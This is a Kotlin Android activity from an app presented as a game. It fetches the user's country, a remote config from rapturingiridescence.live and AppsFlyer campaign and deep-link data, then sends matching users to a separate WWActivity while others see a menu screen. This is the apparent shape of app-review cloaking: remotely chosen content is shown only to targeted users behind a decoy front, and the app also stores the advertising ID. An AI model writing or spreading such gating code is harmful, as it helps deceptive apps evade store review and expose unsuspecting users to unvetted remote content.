package com.proximabeta.game.cont

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.material.snackbar.Snackbar
import com.proximabeta.game.cont.InMainClass.Companion.C1
import com.proximabeta.game.cont.InMainClass.Companion.appsCheck
import com.proximabeta.game.cont.InMainClass.Companion.link
import com.proximabeta.game.cont.InMainClass.Companion.MAIN_ID
import com.orhanobut.hawk.Hawk
import com.proximabeta.game.cont.InMainClass.Companion.DEEPL
import com.proximabeta.game.cont.databinding.ActivityMainBinding
import kotlinx.coroutines.*
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    lateinit var bindMainAct: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindMainAct = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMainAct.root)

        deePP(this)
        GlobalScope.launch(Dispatchers.IO) {
            job
        }

        AppsFlyerLib.getInstance()
            .init("htezBZY3qPJt7qWxcuRR9f", conversionDataListener, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }

    private fun getAdId(){
        val adInfo = AdvertisingIdClient(applicationContext)
        adInfo.start()
        val adIdInfo = adInfo.info.id
        Log.d("getAdvertisingId = ", adIdInfo.toString())
        Hawk.put(MAIN_ID, adIdInfo)
    }


    //Data API
    private suspend fun getData(): String? {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ApiInterface::class.java)

        val retData = retrofitBuilder.getData().body()?.countryCode
        Log.d("Data", "countryCode: $retData ")
        return retData

    }


    //Data Hosting
    private suspend fun getDataDev(): String? {
        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://rapturingiridescence.live/")
            .build()
            .create(ApiInterface::class.java)

        val linkView = retroBuildTwo.getDataDev().body()?.view
        Log.d("Data", "getDataDev: $linkView")
        val appsChecker = retroBuildTwo.getDataDev().body()?.appsChecker
        Hawk.put(appsCheck, appsChecker)
        Hawk.put(link, linkView)
        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(link, "null")}")
        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(appsCheck, "null")}")
        val retroData = retroBuildTwo.getDataDev().body()?.geo
        Log.d("Data", retroData.toString())
        return retroData
    }

    //
    private val job: Job = GlobalScope.launch(Dispatchers.IO) {
        val countyCode: String = getData().toString()
        val countriesPool = getDataDev().toString()
        val deeplink: String? = Hawk.get(DEEPL, "null") //здесь нужен дефолтный ноль
        Snackbar.make(
            bindMainAct.root, deeplink.toString(),
            Snackbar.LENGTH_LONG
        ).show()

        val appsCh = Hawk.get(appsCheck, "null")
        var naming: String? = Hawk.get(C1)
        getAdId()
        if (appsCh == "1") {
            val executorService = Executors.newSingleThreadScheduledExecutor()
            executorService.scheduleAtFixedRate({
                if (naming != null) {
                    Log.d("TestInUIHawk", naming.toString())
                    //вот тут добавил диплинк в or

                    if (naming!!.contains("tdb2") || countriesPool.contains(countyCode) || deeplink!!.contains("tdb2")) {
                        Log.d("Apps Checker", "naming: $naming")
                        executorService.shutdown()
                        startActivity(Intent(this@MainActivity, WWActivity::class.java))
                        finish()
                    } else {
                        executorService.shutdown()
                        startActivity(Intent(this@MainActivity, MenuActivity::class.java))
                        finish()
                    }
                } else {
                    naming = Hawk.get(C1)
                    Log.d("TestInUIHawk", "Received null $naming")
                }

            }, 0, 2, TimeUnit.SECONDS)
        }
        else if (countriesPool.contains(countyCode)) {
            startActivity(Intent(this@MainActivity, WWActivity::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, MenuActivity::class.java))
            finish()
        }
    }

    private val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(C1, dataGotten)
        }

        override fun onConversionDataFail(p0: String?) {
            Log.e("dev_test", "error getting conversion data: $p0" );
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }


    fun deePP(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host.toString()
                Hawk.put(DEEPL, params)
            }
            if (appLinkData == null) {

            }
        }
    }
}